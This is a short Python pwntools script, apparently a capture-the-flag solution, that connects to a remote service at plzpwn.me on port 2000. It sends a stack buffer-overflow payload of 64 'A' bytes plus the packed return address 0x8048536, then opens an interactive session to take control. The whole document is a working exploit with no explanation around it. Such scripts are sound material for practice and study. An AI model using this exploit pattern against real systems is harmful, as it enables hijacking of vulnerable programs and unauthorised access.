from pwn import *

p = remote('plzpwn.me','2000')
print(p.recv())
p.sendline('A'*64 + p32(0x8048536))
print(p.recv())
p.interactive()

